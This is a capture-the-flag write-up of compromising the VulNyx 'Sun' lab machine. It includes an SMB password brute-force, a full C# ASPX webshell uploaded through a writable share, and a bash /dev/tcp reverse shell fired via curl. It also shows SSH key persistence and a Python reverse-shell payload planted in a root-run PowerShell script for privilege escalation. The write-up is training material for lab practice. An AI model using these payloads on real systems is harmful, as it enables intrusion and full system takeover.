# Recon
open ports ; 22, 80, 8080, 445, 139
```shell
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp   open  http        nginx 1.22.1
|_http-title: Sun
|_http-server-header: nginx/1.22.1
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8080/tcp open  http        nginx 1.22.1
|_http-title: Sun
|_http-server-header: nginx/1.22.1
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SUN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-04-03T18:54:43
|_  start_date: N/A
|_clock-skew: 59m59s
```

# Samba enum
smbmap to check perms
```shell
[+] IP: 192.168.174.133:445	Name: 192.168.174.133     	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.17.12-Debian)
	nobody                                            	NO ACCESS	File Upload Path
```
the comment on the `nobody` share is interesting. Worth noting.

user enum with enum4linux via RID cycling: 
```shell
$ enum4linux-ng 192.168.174.134 -R
 =====================================================================
|    Users, Groups and Machines on 192.168.174.134 via RID Cycling    |
 =====================================================================
[*] Trying to enumerate SIDs
[+] Found 3 SID(s)
[*] Trying SID S-1-22-1
[+] Found user 'Unix User\punt4n0' (RID 1000)
```
only valid user should be `punt4n0` cause of the 1000 UID.

bruteforce the user's creds we have `sunday` as his creds
```shell
$ nxc smb 192.168.174.133 -u punt4n0 -p /opt/sc/rockyou-75.txt
SMB         192.168.174.133 445    SUN              [+] SUN\punt4n0:sunday 
```
enumerate the access we have on shares now with this
```
┌──(rami㉿zen)-[~/labs/vulnyx/sun]
└─$ nxc smb 192.168.174.134 -u punt4n0 -p sunday --shares
SMB         192.168.174.134 445    SUN              [*] Windows 6.1 Build 0 (name:SUN) (domain:SUN) (signing:False) (SMBv1:False)
SMB         192.168.174.134 445    SUN              [+] SUN\punt4n0:sunday 
SMB         192.168.174.134 445    SUN              [*] Enumerated shares
SMB         192.168.174.134 445    SUN              Share           Permissions     Remark
SMB         192.168.174.134 445    SUN              -----           -----------     ------
SMB         192.168.174.134 445    SUN              print$          READ            Printer Drivers
SMB         192.168.174.134 445    SUN              IPC$                            IPC Service (Samba 4.17.12-Debian)
SMB         192.168.174.134 445    SUN              punt4n0         READ,WRITE      File Upload Path
```
we can write to the `nobody` share, it also seems to be the document root folder of both web services running from the files present.

# 80 Recon
this service was basically useless.

# 8080 Recon
sending a malformed request to the site leaks an error page telling Mono is running, Mono is a package for running C# code/executables in linux, the version running on a server might be vulnerable to CVE-2023-26314 or might just be a rabbit hole cause I was stuck on that for hours. a tip from Jackie helped to try out aspx shell(Wappalyzer would also help identify the site runs on ASP.NET). I wrote a simple webshell reusing C# code from revshells.com 
```asp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">

protected void Page_Load(object sender, EventArgs e)
{
    string cmd = Request["cmd"];
    
    if (!string.IsNullOrEmpty(cmd))
    {
        ExecuteCommand(cmd);
    }
}

private void ExecuteCommand(string command)
{
    try
    {
        Process proc = new Process();
        proc.StartInfo.FileName = "/bin/bash";
        proc.StartInfo.Arguments = "-c \"" + command + "\"";
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.CreateNoWindow = true;
        proc.Start();
        
        string output = proc.StandardOutput.ReadToEnd();
        Response.Write(output);
        proc.WaitForExit();
    }
    catch (Exception ex)
    {
        Response.Write("Error: " + ex.Message);
    }
}

</script>
```
The `page_load` event handler will check if the `cmd` parameter exist in the GET request, and if it does it will pass its value to the  `ExecuteCommand` method. `ExecuteCommand` creates a new process for executing the command using /bin/bash as the shell and the commands you give it is passed as an argument to bash. The output of the command execution is read and sent back as the response to the HTTP request, and finally any errors are handled by an exception and displayed.

uploaded this via smb, since the 2 services are linked by sharing document roots, we can access the aspx shell from the web server on port 8080 and mono will allow the content of the page/script to be executed:
```shell
smb: \> put b.aspx
putting file b.aspx as \b.aspx (67.7 kb/s) (average 116.9 kb/s)
```
command execution 
```shell
┌──(rami㉿zen)-[~/labs/vulnyx/sun]
└─$ curl http://192.168.174.134:8080/b.aspx?cmd=id
uid=1000(punt4n0) gid=1000(punt4n0) grupos=1000(punt4n0)
```
send a shell : 
```shell
$ curl "http://192.168.174.134:8080/b.aspx?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.174.129%2F1337%200%3E%261"
```

# FootHold
```shell
┌──(rami㉿zen)-[~/labs/vulnyx/sun]
└─$ ncat -nvlp 1337
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.174.134:45468.
bash: no se puede establecer el grupo de proceso de terminal (469): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
punt4n0@sun:~$ whoami
whoami
punt4n0
punt4n0@sun:~$ ls  
ls
user.txt
```
In the users home directory, there's a hidden remember_password file containing a possible password who doesnt love those lol, you can just generate a new rsa key on your box `ssh-keygen -t rsa` and copy the public key and append that to the authorized_keys file of the user
```shell
punt4n0@sun:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkrnF0/hTQnKX+0JaqGWRxa3uPiccU/kefcnwdc3Y+7Mw/slKYugyQXxvXTVE38wQFKF0MpoYfbGkn1d5HVjwLc5F6mmOKrsAfbbsPjbJC7NIWOtDiybHHOxbMmUkiHkCOZjy0A2ajNlhU83jnofNC/opQctdH9rBiBdFvy+Dsn8YD/P3sOnFFTnekOe8EC13DPzqheGuVTI88wczOmFVOSOpKbMs289cXvAwHivCC/ghoiyNWDrwwuKn6LdLowTrXEhbBWYHi+MlSblHipgYH44BNoI9uRSUbqer45kUcqjpLpSEHEhE+u2xoQRZIseuFNl1b+AklDzsSDFZEC7dxhafGnNMS1D99cpZQwEWfm0rPYCIE2/7cjxzxECvxR9GZd2nfVt1v8KSP4fQ7VpMv/sVipSdgSAYQ70TUcxAQ1R8Whpn4cBLxwjwA1QGAgJ9h7GcPvv8biE/6yJHFSC4b6QnzQbrOUSZRCMyAI4Dsa3K5DdXdiWNaohurF2pPWiU= rami@zen" | tee -a ~/.ssh/authorized_keys
```

we can establish a stable shell with ssh and continue to pwn the box - in the /opt/ directory there is a `service.ps1` powershell script that belongs to the root user and is writable by us, reading the script
```shell
punt4n0@sun:/opt$ ls -la 
total 16
drwxr-xr-x  3 root root 4096 abr  2 10:58 .
drwxr-xr-x 18 root root 4096 abr  1 13:24 ..
drwx------  3 root root 4096 abr  1 18:53 microsoft
-rwx---rw-  1 root root   97 abr  2 10:58 service.ps1
```

it saves the output of the id command to /dev/shm/out file, its possible a process executes the script in the backgorund (this box was so twisted and didnt also have binaries you would use for file transfer, one way to go about that would be to use the bash exec /dev/tcp technique) so we can run commands as root effectively once we are able to write a powershell script to execute a linux command, I did this with powershell IEX and put the following content with nano (only a python or maybe perl shell would work, bash didnt work for some reason, if you know why I'd love to discuss that on discord @hesrami) : 
```shell
punt4n0@sun:/opt$ cat service.ps1 
$command = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""192.168.174.129"",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(""bash"")'"

Invoke-Expression -Command $command
```

and receive a reverse shell on port 1338 as root.
```shell
┌──(rami㉿zen)-[~/labs/vulnyx/sun]
└─$ ncat -nvlp 1338
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:1338
Ncat: Listening on 0.0.0.0:1338
Ncat: Connection from 192.168.174.134:57940.
root@sun:~# hostnamectl
root@sun:~# whoami; id; hostnamectl
whoami; id; hostnamectl
root
uid=0(root) gid=0(root) grupos=0(root)
 Static hostname: sun
       Icon name: computer-vm
         Chassis: vm 🖴
      Machine ID: 6e1aca33dec44fef9ccdccf718c8150a
         Boot ID: ac6fe16725904d439c4bdc54b9adde3f
  Virtualization: vmware
Operating System: Debian GNU/Linux 12 (bookworm)
          Kernel: Linux 6.1.0-18-amd64
    Architecture: x86-64
 Hardware Vendor: VMware, Inc.
  Hardware Model: VMware Virtual Platform
Firmware Version: 6.00
root@sun:~# 
```
Another amazing box from d4t4sec!
